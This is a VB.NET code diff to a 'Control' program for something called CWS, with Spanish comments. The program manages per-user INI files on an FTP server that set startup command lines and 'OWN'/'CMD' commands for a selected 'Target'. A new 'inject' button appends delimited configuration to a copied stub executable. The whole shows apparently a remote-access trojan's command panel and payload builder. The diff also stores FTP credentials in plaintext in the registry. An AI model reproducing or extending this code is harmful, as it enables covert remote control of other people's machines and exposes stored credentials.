@@ -2,11 +2,12 @@
 Imports System.Net
 Imports System.Runtime.InteropServices
 Imports System.Text
+Imports Microsoft.Win32
 Public Class Main
-    Dim Host As String = ""
-    Dim HostRootDirectory As String = "/public_html/CWS"
-    Dim HostUser As String = ""
-    Dim HostPassword As String = ""
+    Dim Host As String = Nothing
+    Dim HostRootDirectory As String = Nothing
+    Dim HostUser As String = Nothing
+    Dim HostPassword As String = Nothing
     Public DIRCommons As String = "C:\Users\" & Environment.UserName & "\AppData\Local\CWS"
     Private Sub Main_Load(sender As Object, e As EventArgs) Handles MyBase.Load
         If My.Computer.FileSystem.DirectoryExists(DIRCommons) = False Then
@@ -16,9 +17,122 @@ Public Class Main
             My.Computer.FileSystem.DeleteDirectory(DIRCommons & "\Control", FileIO.DeleteDirectoryOption.DeleteAllContents)
         End If
         My.Computer.FileSystem.CreateDirectory(DIRCommons & "\Control")
+        LoadConfig()
         IndexTheFiles()
+        ReadGeneralConfigFile()
     End Sub
 
+    Sub SaveConfig()
+        Try
+            Dim regKey As RegistryKey = Registry.CurrentUser.OpenSubKey("Software\\CWS\\Control", True)
+            If regKey Is Nothing Then
+                Registry.CurrentUser.CreateSubKey("Software\\CWS\\Control")
+            End If
+            regKey = Registry.CurrentUser.OpenSubKey("Software\\CWS\\Control", True)
+            regKey.SetValue("Host", Host)
+            regKey.SetValue("HostRootDirectory", HostRootDirectory)
+            regKey.SetValue("HostUser", HostUser)
+            regKey.SetValue("HostPassword", HostPassword)
+            regKey.Close()
+            LoadConfig()
+        Catch ex As Exception
+            AddToLog("[SaveConfig@Main]Error: ", ex.Message, True)
+        End Try
+    End Sub
+
+    Sub LoadConfig()
+        Try
+
+            Dim regKey As RegistryKey = Registry.CurrentUser.OpenSubKey("Software\\CWS\\Control", True)
+            If regKey Is Nothing Then
+pedirdatos:
+                Dim Dato1 = InputBox("Ingrese el Host", "Control para Servidor")
+                Dim Dato2 = InputBox("Ingrese el HostRootDirectory", "Control para Servidor")
+                Dim Dato3 = InputBox("Ingrese el HostUser", "Control para Servidor")
+                Dim Dato4 = InputBox("Ingrese el HostPassword", "Control para Servidor")
+                If Dato1 = Nothing Then
+                    GoTo pedirdatos
+                Else
+                    If Dato2 = Nothing Then
+                        GoTo pedirdatos
+                    Else
+                        If Dato3 = Nothing Then
+                            GoTo pedirdatos
+                        Else
+                            If Dato4 = Nothing Then
+                                GoTo pedirdatos
+                            Else
+                                Host = Dato1
+                                HostRootDirectory = Dato2
+                                HostUser = Dato3
+                                HostPassword = Dato4
+                                SaveConfig()
+                            End If
+                        End If
+                    End If
+                End If
+                Registry.CurrentUser.CreateSubKey("Software\\CWS\\Control")
+            End If
+            regKey = Registry.CurrentUser.OpenSubKey("Software\\CWS\\Control", True)
+            Host = regKey.GetValue("Host")
+            HostRootDirectory = regKey.GetValue("HostRootDirectory")
+            HostUser = regKey.GetValue("HostUser")
+            HostPassword = regKey.GetValue("HostPassword")
+            regKey.Close()
+            Me.Text = "Control | Connected to " & Host.Replace("ftp://", Nothing)
+        Catch ex As Exception
+            AddToLog("[LoadConfig@Main]Error: ", ex.Message, True)
+        End Try
+    End Sub
+
+    Sub ReadGeneralConfigFile()
+        Try
+            'descargar el fichero
+            Dim remoteFilePath As String = Host & HostRootDirectory & "/General.ini"
+            Dim localFilePath As String = DIRCommons & "\Control\General.ini"
+            My.Computer.Network.DownloadFile(remoteFilePath, localFilePath, HostUser, HostPassword)
+            'abrirlo
+            TextBox10.Text = GetIniValue("Status", "IsEnabled", localFilePath)
+            TextBox11.Text = GetIniValue("Status", "IsReading", localFilePath)
+            TextBox12.Text = GetIniValue("Assembly", "Name", localFilePath)
+            TextBox13.Text = GetIniValue("Assembly", "Version", localFilePath)
+            TextBox14.Text = GetIniValue("Updates", "Download", localFilePath)
+            TextBox15.Text = GetIniValue("Variables", "HostDomain", localFilePath)
+            TextBox16.Text = GetIniValue("Variables", "GeneralConfigFileReaderTimeout", localFilePath)
+            TextBox17.Text = GetIniValue("Variables", "PrivateConfigFileReaderTimeout", localFilePath)
+        Catch ex As Exception
+            AddToLog("[ReadGeneralConfigFile@Main]Error: ", ex.Message, True)
+        End Try
+    End Sub
+    Private Sub BtnAplicarGeneralConfigFile_Click(sender As Object, e As EventArgs) Handles Button5.Click
+        Try
+            Dim remoteFilePath As String = Host & HostRootDirectory & "/General.ini"
+            Dim localFilePath As String = DIRCommons & "\Control\General.ini"
+            'guardar el fichero
+            Dim content As String = "# CWS General" &
+                vbCrLf & "[Status]" &
+                vbCrLf & "IsEnabled=" & TextBox10.Text &
+                vbCrLf & "IsReading=" & TextBox11.Text &
+                vbCrLf & "[Assembly]" &
+                vbCrLf & "Name=" & TextBox12.Text &
+                vbCrLf & "Version=" & TextBox13.Text &
+                vbCrLf & "[Updates]" &
+                vbCrLf & "Download=" & TextBox14.Text &
+                vbCrLf & "[Variables]" &
+                vbCrLf & "HostDomain=" & TextBox15.Text &
+                vbCrLf & "GeneralConfigFileReaderTimeout=" & TextBox16.Text &
+                vbCrLf & "PrivateConfigFileReaderTimeout=" & TextBox17.Text
+            If My.Computer.FileSystem.FileExists(localFilePath) Then
+                My.Computer.FileSystem.DeleteFile(localFilePath)
+            End If
+            My.Computer.FileSystem.WriteAllText(localFilePath, content, False)
+            'subirlo
+            My.Computer.Network.UploadFile(localFilePath, remoteFilePath, HostUser, HostPassword)
+            MsgBox("Fichero correctamente subido")
+        Catch ex As Exception
+            AddToLog("[BtnAplicarGeneralConfigFile_Click@Main]Error: ", ex.Message, True)
+        End Try
+    End Sub
     Sub IndexTheFiles()
         Try
             Dim request As FtpWebRequest = CType(WebRequest.Create(Host & HostRootDirectory & "/Users"), FtpWebRequest)
@@ -57,24 +171,13 @@ Public Class Main
                 LogContent &= Header & content
             End If
             Console.WriteLine(LogContent)
-            My.Computer.FileSystem.WriteAllText(DIRCommons & "\Install.log", LogContent & vbCrLf, Overwrite)
+            My.Computer.FileSystem.WriteAllText(DIRCommons & "\Registro.log", LogContent & vbCrLf, Overwrite)
         Catch
         End Try
     End Sub
     Private Sub BtnEditar_Click(sender As Object, e As EventArgs) Handles Button1.Click
         Try
-            'descargar el fichero
-            Dim remoteFilePath As String = Host & HostRootDirectory & "/Users/" & ListBox1.SelectedItem
-            Dim localFilePath As String = DIRCommons & "\Control\" & ListBox1.SelectedItem
-            My.Computer.Network.DownloadFile(remoteFilePath, localFilePath, HostUser, HostPassword)
-            'abrirlo
-            TextBox1.Text = GetIniValue("Status", "IsEnabled", localFilePath)
-            TextBox2.Text = GetIniValue("Status", "IsReading", localFilePath)
-            TextBox3.Text = GetIniValue("Startup", "CommandLine", localFilePath)
-            TextBox4.Text = GetIniValue("Startup", "ArgumentLine", localFilePath)
-            TextBox5.Text = GetIniValue("Commands", "OWN", localFilePath)
-            TextBox6.Text = GetIniValue("Commands", "CMD", localFilePath)
-            TextBox7.Text = LeerFicheroDesdeLinea(11, localFilePath)
+            GetTheFile(ListBox1.SelectedItem)
         Catch ex As Exception
             AddToLog("[BtnEditar_Click@Main]Error: ", ex.Message, True)
         End Try
@@ -102,6 +205,24 @@ Public Class Main
             End Try
         End If
     End Function
+    Sub GetTheFile(ByVal name As String)
+        Try
+            'descargar el fichero
+            Dim remoteFilePath As String = Host & HostRootDirectory & "/Users/" & name
+            Dim localFilePath As String = DIRCommons & "\Control\" & name
+            My.Computer.Network.DownloadFile(remoteFilePath, localFilePath, HostUser, HostPassword)
+            'abrirlo
+            TextBox1.Text = GetIniValue("Status", "IsEnabled", localFilePath)
+            TextBox2.Text = GetIniValue("Status", "IsReading", localFilePath)
+            TextBox3.Text = GetIniValue("Startup", "CommandLine", localFilePath)
+            TextBox4.Text = GetIniValue("Startup", "ArgumentLine", localFilePath)
+            TextBox5.Text = GetIniValue("Commands", "OWN", localFilePath)
+            TextBox6.Text = GetIniValue("Commands", "CMD", localFilePath)
+            TextBox7.Text = LeerFicheroDesdeLinea(11, localFilePath)
+        Catch ex As Exception
+            AddToLog("[GetTheFile@Main]Error: ", ex.Message, True)
+        End Try
+    End Sub
     Private Sub BtnEnviar_Click(sender As Object, e As EventArgs) Handles Button2.Click
         Try
             Dim remoteFilePath As String = Host & HostRootDirectory & "/Users/" & ListBox1.SelectedItem
@@ -130,9 +251,40 @@ Public Class Main
             AddToLog("[BtnEnviar_Click@Main]Error: ", ex.Message, True)
         End Try
     End Sub
-
     Private Sub ListBox1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles ListBox1.SelectedIndexChanged
         Label8.Text = "Target: " & ListBox1.SelectedItem
+    End Sub
+    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
+        GetTheFile(ListBox1.SelectedItem)
+    End Sub
+    Private Sub BtnInyectar_Click(sender As Object, e As EventArgs) Handles Button4.Click
+        Try
+            Dim ExecutableFilePath As String
+            Dim OpenFile As New OpenFileDialog
+            OpenFile.Title = "Abrir EXInstaller..."
+            OpenFile.Filter = "All file types (*.*)|*.*|Executable (*.exe)|*.exe"
+            OpenFile.InitialDirectory = Application.StartupPath
+            OpenFile.Multiselect = False
+            If OpenFile.ShowDialog() = Windows.Forms.DialogResult.OK Then
+                TextBox8.Text = OpenFile.FileName
+                ExecutableFilePath = OpenFile.FileName
+            End If
+            Dim stub As String
+            Const FS1 As String = "|CWS|"
+            Dim Temp As String = Application.StartupPath & "\CWS.exe"
+            Dim bytesEXE As Byte() = System.IO.File.ReadAllBytes(ExecutableFilePath)
+            File.WriteAllBytes(Temp, bytesEXE)
+            FileOpen(1, Temp, OpenMode.Binary, OpenAccess.Read, OpenShare.Default)
+            stub = Space(LOF(1))
+            FileGet(1, stub)
+            FileClose(1)
+            FileOpen(1, Temp, OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
+            FilePut(1, stub & FS1 & TextBox9.Text & FS1)
+            FileClose(1)
+            MsgBox("Inyectado correctamente!" & vbCrLf & "Guardado en : " & Temp)
+        Catch ex As Exception
+            AddToLog("[IndexTheFiles@Main]Error: ", ex.Message, True)
+        End Try
     End Sub
 End Class
 Module Complementos
